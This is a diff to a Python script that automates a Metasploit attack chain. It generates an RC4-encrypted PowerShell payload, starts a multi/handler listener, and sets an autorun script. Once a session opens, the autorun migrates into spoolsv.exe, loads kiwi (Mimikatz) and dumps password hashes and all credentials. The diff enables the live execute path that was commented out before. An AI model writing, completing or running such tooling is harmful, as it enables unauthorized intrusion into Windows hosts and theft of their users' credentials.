@@ -6,10 +6,9 @@ import getopt, os, sys, pyperclip, socket
 import urllib, json
 from sys import argv
 
-filePowershell = 'rc4.ps1'
-fileAutoscript = 'commands.rc'a
-filerc4listener = "rc4_listener.rc"
-msfvenomPath = ''
+filePowershell = 'rc4_payload.ps1'
+fileAutoscript = 'autorun_commands.rc'
+filerc4listener = 'rc4_listener.rc'
 
 def get_external_address():
 	data = json.loads(urllib.urlopen("http://ip.jsontest.com/").read())
@@ -49,17 +48,14 @@ def payloadGenerator(msfPayload,lhost,lport,rc4Password, verboseChoice):
 
 def autorunscript():
 	print('Create autorunscript')
-	with open(fileAutoscript, 'r+') as f1:
+	with open(fileAutoscript, 'w') as f1:
 		f1.write("migrate -N spoolsv.exe\n"+\
 				 "load kiwi\n"+\
 				 "sysinfo\n"+\
 				 "hashdump\n"+\
 				 "creds_all")
-	f2 = f1.read()
-	print(f2)
-	return f2
 
-def listener(lhost,rc4Password): 
+def listener(msfPayload,lhost,lport,rc4Password): 
 	#Creates resource file(with autorunscripts builtin) and launches listener.
 	with open(filerc4listener, 'w') as f:
 		f.write("use multi/handler"+"\n"+\
@@ -70,7 +66,7 @@ def listener(lhost,rc4Password):
 				"set ExitOnSession false"+"\n"+\
 				"set AutoRunScript multi_console_command -rc"+fileAutoscript+"\n"+\
 				"exploit -j -z")
-	os.system('msfconsole -q -r rc4.rc')
+	os.system('msfconsole -q -r '+filerc4listener)
 	sys.exit(2)
 
 def help():
@@ -125,12 +121,11 @@ def main(argv):
         			rc4Password = arg
         		elif opt in ('-v', '--verbose'):
         			verboseChoice = arg
-        		#Executes listener, and copies payload to clipboard
+        		#Executes listener
         		elif opt in ('-e','--execute'): 
         			if arg == "true":
-        				print('diagnostic print statement, please remove.')
-        				# payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
-        				# listener(lhost,rc4Password)
+        				payloadGenerator(msfPayload,lhost,lport,rc4Password,verboseChoice)
+        				listener(msfPayload,lhost,lport,rc4Password)
         		else:
         			help()
         			sys.exit(2)
